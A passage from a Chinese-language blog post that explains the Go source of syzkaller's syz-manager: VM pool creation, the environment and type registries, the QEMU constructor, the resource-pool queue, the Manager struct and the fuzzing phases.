class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(pool *Pool)</span></span> Count() <span class="hljs-type">int</span> &#123;<br><span class="hljs-keyword">return</span> pool.cfg.Count<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Create()</code> 则会首先检查文件系统镜像是否为 <code>9p</code> 格式，若是则会生成一个 ssh key 存放到 <code>key</code> 文件中并生成一个 <code>init.sh</code> 文件；接下来就是调用 <code>ctor()</code> 函数创建虚拟机：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(pool *Pool)</span></span> Create(workdir <span class="hljs-type">string</span>, index <span class="hljs-type">int</span>) (vmimpl.Instance, <span class="hljs-type">error</span>) &#123;<br>sshkey := pool.env.SSHKey<br>sshuser := pool.env.SSHUser<br><span class="hljs-keyword">if</span> pool.env.Image == <span class="hljs-string">&quot;9p&quot;</span> &#123;<br>sshkey = filepath.Join(workdir, <span class="hljs-string">&quot;key&quot;</span>)<br>sshuser = <span class="hljs-string">&quot;root&quot;</span><br><span class="hljs-keyword">if</span> _, err := osutil.RunCmd(<span class="hljs-number">10</span>*time.Minute, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;ssh-keygen&quot;</span>, <span class="hljs-string">&quot;-t&quot;</span>, <span class="hljs-string">&quot;rsa&quot;</span>, <span class="hljs-string">&quot;-b&quot;</span>, <span class="hljs-string">&quot;2048&quot;</span>,<br><span class="hljs-string">&quot;-N&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;-C&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;-f&quot;</span>, sshkey); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br>initFile := filepath.Join(workdir, <span class="hljs-string">&quot;init.sh&quot;</span>)<br><span class="hljs-keyword">if</span> err := osutil.WriteExecFile(initFile, []<span class="hljs-type">byte</span>(strings.Replace(initScript, <span class="hljs-string">&quot;&#123;&#123;KEY&#125;&#125;&quot;</span>, sshkey, <span class="hljs-number">-1</span>))); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;failed to create init file: %v&quot;</span>, err)<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; ; i++ &#123;<br>inst, err := pool.ctor(workdir, sshkey, sshuser, index)<br><span class="hljs-keyword">if</span> err == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> inst, <span class="hljs-literal">nil</span><br>&#125;<br><span class="hljs-comment">// Older qemu prints &quot;could&quot;, newer -- &quot;Could&quot;.</span><br><span class="hljs-keyword">if</span> i &lt; <span class="hljs-number">1000</span> &amp;&amp; strings.Contains(err.Error(), <span class="hljs-string">&quot;ould not set up host forwarding rule&quot;</span>) &#123;<br><span class="hljs-keyword">continue</span><br>&#125;<br><span class="hljs-keyword">if</span> i &lt; <span class="hljs-number">1000</span> &amp;&amp; strings.Contains(err.Error(), <span class="hljs-string">&quot;Device or resource busy&quot;</span>) &#123;<br><span class="hljs-keyword">continue</span><br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><code>ctor()</code> 的实现比较简单，主要就是创建一个带着 ssh key 及一些配置信息与一个 channel 的 <code>instance</code> 实例，初始化实例内的管道并调用 <code>boot()</code> 函数进行正式的创建：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(pool *Pool)</span></span> ctor(workdir, sshkey, sshuser <span class="hljs-type">string</span>, index <span class="hljs-type">int</span>) (vmimpl.Instance, <span class="hljs-type">error</span>) &#123;<br>inst := &amp;instance&#123;<br>index:      index,<br>cfg:        pool.cfg,<br>target:     pool.target,<br>archConfig: pool.archConfig,<br>version:    pool.version,<br>image:      pool.env.Image,<br>debug:      pool.env.Debug,<br>os:         pool.env.OS,<br>timeouts:   pool.env.Timeouts,<br>workdir:    workdir,<br>sshkey:     sshkey,<br>sshuser:    sshuser,<br>diagnose:   <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">bool</span>, <span class="hljs-number">1</span>),<br>&#125;<br><span class="hljs-keyword">if</span> st, err := os.Stat(inst.image); err != <span class="hljs-literal">nil</span> &amp;&amp; st.Size() == <span class="hljs-number">0</span> &#123;<br><span class="hljs-comment">// Some kernels may not need an image, however caller may still</span><br><span class="hljs-comment">// want to pass us a fake empty image because the rest of syzkaller</span><br><span class="hljs-comment">// assumes that an image is mandatory. So if the image is empty, we ignore it.</span><br>inst.image = <span class="hljs-string">&quot;&quot;</span><br>&#125;<br>closeInst := inst<br><span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">if</span> closeInst != <span class="hljs-literal">nil</span> &#123;<br>closeInst.Close()<br>&#125;<br>&#125;()<br><br><span class="hljs-keyword">var</span> err <span class="hljs-type">error</span><br>inst.rpipe, inst.wpipe, err = osutil.LongPipe()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><br><span class="hljs-keyword">if</span> err := inst.boot(); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><br>closeInst = <span class="hljs-literal">nil</span><br><span class="hljs-keyword">return</span> inst, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>boot()</code> 函数主要就是各种参数判断，之后<strong>把 QEMU 起了以后 ssh 连上去</strong>，这里就不摘抄代码了：）</p><h3 id="3-Env：单个-VM-Pool-的环境变量"><a href="#3-Env：单个-VM-Pool-的环境变量" class="headerlink" title="3. Env：单个  VM Pool 的环境变量"></a>3. Env：单个  VM Pool 的环境变量</h3><p><code>Env</code> 结构体为用于一个 VM Pool 的环境变量，定义于 <code>vm/vmimpl/vmimpl.go</code> 中：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Env 包含了用于 VM 池的全局常量参数.</span><br><span class="hljs-keyword">type</span> Env <span class="hljs-keyword">struct</span> &#123;<br><span class="hljs-comment">// 独特的名字</span><br><span class="hljs-comment">// 若几个 Pool 共享了全局命名空间则可被用于 VM name 的冲突解决</span><br>Name      <span class="hljs-type">string</span><br>OS        <span class="hljs-type">string</span> <span class="hljs-comment">// 目标 OS</span><br>Arch      <span class="hljs-type">string</span> <span class="hljs-comment">// 目标 arch</span><br>Workdir   <span class="hljs-type">string</span><br>Image     <span class="hljs-type">string</span><br>SSHKey    <span class="hljs-type">string</span><br>SSHUser   <span class="hljs-type">string</span><br>Timeouts  targets.Timeouts<br>Debug     <span class="hljs-type">bool</span><br>Config    []<span class="hljs-type">byte</span> <span class="hljs-comment">// json-序列化的 VM-类型-特定配置</span><br>KernelSrc <span class="hljs-type">string</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="4-Type：VM-类型"><a href="#4-Type：VM-类型" class="headerlink" title="4. Type：VM 类型"></a>4. Type：VM 类型</h3><p>一个 VM Pool 中只能有一种类型的 VM，因而不同类型的 VM 的 Pool 应当要有不同的构造函数，在 <code>syz-manager</code> 中使用 <code>Type</code> 结构体表示一种 VM 的类型信息，定义于 <code>vm/vmimpl/vmimpl.go</code> 中：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Type <span class="hljs-keyword">struct</span> &#123;<br>Ctor       ctorFunc<br>Overcommit <span class="hljs-type">bool</span><br>&#125;<br><br><span class="hljs-keyword">type</span> ctorFunc <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(env *Env)</span></span> (Pool, <span class="hljs-type">error</span>)<br></code></pre></td></tr></table></figure><p><code>ctorFunc</code> 为构造函数类型，其接受一个 <code>Env</code> 类型的结构体指针（储存了全局的一些基本信息），并返回一个 VM Pool 实例</p><p>由一个全局的 <code>string→Type</code> 映射表存储了不同类型 VM 的信息，在正式启动之前程序会通过 <code>Register()</code> 函数将不同类型的 VM 信息注册到该表中，定义于 <code>vm/vmimpl/vmimpl.go</code> 中：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Register 在包中注册一个新的 VM 类型.</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Register</span><span class="hljs-params">(typ <span class="hljs-type">string</span>, ctor ctorFunc, allowsOvercommit <span class="hljs-type">bool</span>)</span></span> &#123;<br>Types[typ] = Type&#123;<br>Ctor:       ctor,<br>Overcommit: allowsOvercommit,<br>&#125;<br>&#125;<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-keyword">var</span>(<br>    <span class="hljs-comment">//...</span><br>Types = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]Type)<br></code></pre></td></tr></table></figure><p>以 <code>QEMU</code> 为例，其在包被导入时注册构造函数，主要是调用 <code>LoadData()</code> 解析配置文件后进行检查，这里不再赘叙：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">init</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> _ vmimpl.Infoer = (*instance)(<span class="hljs-literal">nil</span>)<br>vmimpl.Register(<span class="hljs-string">&quot;qemu&quot;</span>, ctor, <span class="hljs-literal">true</span>)<br>&#125;<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ctor</span><span class="hljs-params">(env *vmimpl.Env)</span></span> (vmimpl.Pool, <span class="hljs-type">error</span>) &#123;<br>archConfig := archConfigs[env.OS+<span class="hljs-string">&quot;/&quot;</span>+env.Arch]<br>cfg := &amp;Config&#123;<br>Count:       <span class="hljs-number">1</span>,<br>CPU:         <span class="hljs-number">1</span>,<br>Mem:         <span class="hljs-number">1024</span>,<br>ImageDevice: <span class="hljs-string">&quot;hda&quot;</span>,<br>Qemu:        archConfig.Qemu,<br>QemuArgs:    archConfig.QemuArgs,<br>NetDev:      archConfig.NetDev,<br>Snapshot:    <span class="hljs-literal">true</span>,<br>&#125;<br><span class="hljs-keyword">if</span> err := config.LoadData(env.Config, cfg); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;failed to parse qemu vm config: %v&quot;</span>, err)<br>&#125;<br><span class="hljs-keyword">if</span> cfg.Count &lt; <span class="hljs-number">1</span> || cfg.Count &gt; <span class="hljs-number">128</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;invalid config param count: %v, want [1, 128]&quot;</span>, cfg.Count)<br>&#125;<br><span class="hljs-keyword">if</span> env.Debug &amp;&amp; cfg.Count &gt; <span class="hljs-number">1</span> &#123;<br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;limiting number of VMs from %v to 1 in debug mode&quot;</span>, cfg.Count)<br>cfg.Count = <span class="hljs-number">1</span><br>&#125;<br><span class="hljs-keyword">if</span> _, err := exec.LookPath(cfg.Qemu); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><span class="hljs-keyword">if</span> env.Image == <span class="hljs-string">&quot;9p&quot;</span> &#123;<br><span class="hljs-keyword">if</span> env.OS != targets.Linux &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;9p image is supported for linux only&quot;</span>)<br>&#125;<br><span class="hljs-keyword">if</span> cfg.Kernel == <span class="hljs-string">&quot;&quot;</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;9p image requires kernel&quot;</span>)<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">if</span> !osutil.IsExist(env.Image) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;image file &#x27;%v&#x27; does not exist&quot;</span>, env.Image)<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> cfg.CPU &lt;= <span class="hljs-number">0</span> || cfg.CPU &gt; <span class="hljs-number">1024</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;bad qemu cpu: %v, want [1-1024]&quot;</span>, cfg.CPU)<br>&#125;<br><span class="hljs-keyword">if</span> cfg.Mem &lt; <span class="hljs-number">128</span> || cfg.Mem &gt; <span class="hljs-number">1048576</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;bad qemu mem: %v, want [128-1048576]&quot;</span>, cfg.Mem)<br>&#125;<br>cfg.Kernel = osutil.Abs(cfg.Kernel)<br>cfg.Initrd = osutil.Abs(cfg.Initrd)<br><br>output, err := osutil.RunCmd(time.Minute, <span class="hljs-string">&quot;&quot;</span>, cfg.Qemu, <span class="hljs-string">&quot;--version&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br>version := <span class="hljs-type">string</span>(bytes.Split(output, []<span class="hljs-type">byte</span>&#123;<span class="hljs-string">&#x27;\n&#x27;</span>&#125;)[<span class="hljs-number">0</span>])<br><br>pool := &amp;Pool&#123;<br>env:        env,<br>cfg:        cfg,<br>version:    version,<br>target:     targets.Get(env.OS, env.Arch),<br>archConfig: archConfig,<br>&#125;<br><span class="hljs-keyword">return</span> pool, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="5-ResourcePool：VM-资源池队列"><a href="#5-ResourcePool：VM-资源池队列" class="headerlink" title="5. ResourcePool：VM 资源池队列"></a>5. ResourcePool：VM 资源池队列</h3><p>Guest VM 的资源调配主要是通过<code>ResourcePool</code> 这一结构来完成的，这实际上是一个 <strong>存放空闲 VM の idx 的单向队列，决定了 VM 的调度顺序</strong>：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> ResourcePool <span class="hljs-keyword">struct</span> &#123;<br>ids   []<span class="hljs-type">int</span><br>mu    sync.RWMutex<br>Freed <span class="hljs-keyword">chan</span> <span class="hljs-keyword">interface</span>&#123;&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>主要定义了这些方法来操纵资源池队列：</p><ul><li><code>Put()</code> ：向队列末尾添加空闲 VM の idx</li><li><code>Len()</code> ：获取队列长度</li><li><code>Take()</code>：从队列首部取出 <code>cnt</code> 个成员</li><li><code>TakeOne()</code> ：从队列首部取出单个成员</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(pool *ResourcePool)</span></span> Put(ids ...<span class="hljs-type">int</span>) &#123;<br>pool.mu.Lock()<br><span class="hljs-keyword">defer</span> pool.mu.Unlock()<br>pool.ids = <span class="hljs-built_in">append</span>(pool.ids, ids...)<br><span class="hljs-comment">// Notify the listener.</span><br><span class="hljs-keyword">select</span> &#123;<br><span class="hljs-keyword">case</span> pool.Freed &lt;- <span class="hljs-literal">true</span>:<br><span class="hljs-keyword">default</span>:<br>&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(pool *ResourcePool)</span></span> Len() <span class="hljs-type">int</span> &#123;<br>pool.mu.RLock()<br><span class="hljs-keyword">defer</span> pool.mu.RUnlock()<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">len</span>(pool.ids)<br>&#125;<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(pool *ResourcePool)</span></span> Take(cnt <span class="hljs-type">int</span>) []<span class="hljs-type">int</span> &#123;<br>pool.mu.Lock()<br><span class="hljs-keyword">defer</span> pool.mu.Unlock()<br>totalItems := <span class="hljs-built_in">len</span>(pool.ids)<br><span class="hljs-keyword">if</span> totalItems &lt; cnt &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br>ret := <span class="hljs-built_in">append</span>([]<span class="hljs-type">int</span>&#123;&#125;, pool.ids[totalItems-cnt:]...)<br>pool.ids = pool.ids[:totalItems-cnt]<br><span class="hljs-keyword">return</span> ret<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(pool *ResourcePool)</span></span> TakeOne() *<span class="hljs-type">int</span> &#123;<br>ret := pool.Take(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">if</span> ret == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br><span class="hljs-keyword">return</span> &amp;ret[<span class="hljs-number">0</span>]<br>&#125;<br></code></pre></td></tr></table></figure><p>同时有一个 <code>SequentialResourcePool()</code> 函数用以初始化资源池：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">SequentialResourcePool</span><span class="hljs-params">(count <span class="hljs-type">int</span>, delay time.Duration)</span></span> *ResourcePool &#123;<br>ret := &amp;ResourcePool&#123;Freed: <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">interface</span>&#123;&#125;, <span class="hljs-number">1</span>)&#125;<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; count; i++ &#123;<br>ret.Put(i)<br>time.Sleep(delay)<br>&#125;<br>&#125;()<br><span class="hljs-keyword">return</span> ret<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="全局管控相关"><a href="#全局管控相关" class="headerlink" title="全局管控相关"></a>全局管控相关</h2><h3 id="1-Manager：基本信息"><a href="#1-Manager：基本信息" class="headerlink" title="1. Manager：基本信息"></a>1. Manager：基本信息</h3><p><code>Manager</code> 结构体用于<strong>表示一个 syz-manager 的基本信息</strong>，定义于 <code>syz-manager/manager.go</code> 中：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Manager <span class="hljs-keyword">struct</span> &#123;<br>cfg            *mgrconfig.Config<br>vmPool         *vm.Pool<br>target         *prog.Target<br>sysTarget      *targets.Target<br>reporter       *report.Reporter<br>crashdir       <span class="hljs-type">string</span><br>serv           *RPCServer<br>corpusDB       *db.DB<br>startTime      time.Time<br>firstConnect   time.Time<br>fuzzingTime    time.Duration<br>stats          *Stats<br>crashTypes     <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span><br>vmStop         <span class="hljs-keyword">chan</span> <span class="hljs-type">bool</span><br>checkResult    *rpctype.CheckArgs<br>fresh          <span class="hljs-type">bool</span><br>numFuzzing     <span class="hljs-type">uint32</span><br>numReproducing <span class="hljs-type">uint32</span><br><br>dash *dashapi.Dashboard<br><br>mu                    sync.Mutex<br>phase                 <span class="hljs-type">int</span><br>targetEnabledSyscalls <span class="hljs-keyword">map</span>[*prog.Syscall]<span class="hljs-type">bool</span><br><br>candidates       []rpctype.Candidate <span class="hljs-comment">// untriaged inputs from corpus and hub</span><br>disabledHashes   <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">struct</span>&#123;&#125;<br>corpus           <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]CorpusItem<br>seeds            [][]<span class="hljs-type">byte</span><br>newRepros        [][]<span class="hljs-type">byte</span><br>lastMinCorpus    <span class="hljs-type">int</span><br>memoryLeakFrames <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span><br>dataRaceFrames   <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span><br>saturatedCalls   <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span><br><br>needMoreRepros <span class="hljs-keyword">chan</span> <span class="hljs-keyword">chan</span> <span class="hljs-type">bool</span><br>hubReproQueue  <span class="hljs-keyword">chan</span> *Crash<br>reproRequest   <span class="hljs-keyword">chan</span> <span class="hljs-keyword">chan</span> <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span><br><br><span class="hljs-comment">// For checking that files that we are using are not changing under us.</span><br><span class="hljs-comment">// Maps file name to modification time.</span><br>usedFiles <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]time.Time<br><br>modules            []host.KernelModule<br>coverFilter        <span class="hljs-keyword">map</span>[<span class="hljs-type">uint32</span>]<span class="hljs-type">uint32</span><br>coverFilterBitmap  []<span class="hljs-type">byte</span><br>modulesInitialized <span class="hljs-type">bool</span><br><br>assetStorage *asset.Storage<br>&#125;<br></code></pre></td></tr></table></figure><p>这里只说明比较关键的几个字段：</p><ul><li><code>cfg</code>：基本设置信息，对应存放在一个 json 文件中</li><li><code>vmPool</code> ：所用的 VM Pool</li><li><code>reporter</code>：用以报告 crash</li><li><code>serv</code> ：RPC Server，用以与 Guest 间通信</li><li><code>corpusDB</code>：存放语料的数据库</li><li><code>targetEnabledSyscalls</code>：测试用例所允许使用的系统调用</li><li><code>candidates</code>：待执行测试用例</li><li><code>corpus</code>：语料库</li><li><code>seeds</code>：用来对语料库变异的种子</li></ul><h3 id="2-fuzzing-phase"><a href="#2-fuzzing-phase" class="headerlink" title="2. fuzzing phase"></a>2. fuzzing phase</h3><p><code>syz-manager</code> 中将 fuzzing 流程分为如下的不同阶段：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">const</span> (<br><span class="hljs-comment">// 刚刚开始，啥都没做.</span><br>phaseInit = <span class="hljs-literal">iota</span><br><span class="hljs-comment">// 加载了语料库且检查了机器.</span><br>phaseLoadedCorpus<br><span class="hljs-comment">// 从语料库中分类了所有输入.</span><br><span class="hljs-comment">// 这是我们开始查询 hub 与最小化连续语料库的时候.</span><br>phaseTriagedCorpus<br><span class="hljs-comment">// 第一个请求发送到了 hub.</span><br>phaseQueriedHub<br><span class="hljs-comment">// 分类所有来自 hub 